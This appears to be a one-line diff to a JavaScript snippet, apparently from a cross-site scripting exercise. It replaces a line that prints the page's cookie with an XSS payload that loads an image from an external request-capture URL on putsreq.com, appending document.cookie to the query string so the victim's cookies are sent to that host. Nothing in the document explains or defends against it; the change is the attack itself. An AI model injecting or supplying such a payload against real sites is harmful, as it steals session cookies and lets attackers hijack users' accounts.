@@ -1,1 +1,1 @@
-document.write("<h1>"+document.cookie+"</h1>");
+image = new Image(); image.src='https://putsreq.com/tubPm3AzJoMAfYozdGz0?c='+document.cookie;
